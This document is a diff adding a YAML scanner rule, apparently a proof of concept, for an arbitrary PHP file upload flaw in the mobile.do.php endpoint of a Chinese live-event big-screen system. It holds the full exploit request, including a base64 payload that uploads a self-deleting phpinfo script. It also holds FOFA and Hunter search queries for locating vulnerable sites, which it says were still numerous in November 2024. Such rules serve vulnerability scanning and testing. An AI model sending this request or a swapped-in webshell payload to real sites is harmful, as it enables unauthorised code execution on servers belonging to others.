@@ -1,0 +1,16 @@
+name: jhdj-fileupload  #金华迪加现场大屏互动系统
+rules: 
+  - method: POST  
+    path: /mobile/mobile.do.php?action=msg_uploadimg
+    headers: 
+      Content-Type: application/x-www-form-urlencoded
+    body: filetype=php&imgbase64=PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=
+    expression:                        
+      status_code:                 
+      response_header:              
+      response_body: \/data\/pic\  #响应包类似{"errno":0,"message":{"picurl":"\/data\/pic\/pic_173087796382260.php","tip":"\u53d1\u9001\u6210\u529f"}}，文件在/data/pic/pic_173087796382260.php                    
+detail:                          
+  description: "金华迪加现场大屏互动系统mobile.do.php接口存在任意文件上传漏洞，截止到2024.11.6仍存在较多该漏洞网站"
+  search:             
+    fofa: body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"
+    鹰图: web.body="/wall/themes/meepo/assets/images/defaultbg.jpg" or web.title="现场活动大屏幕系统"
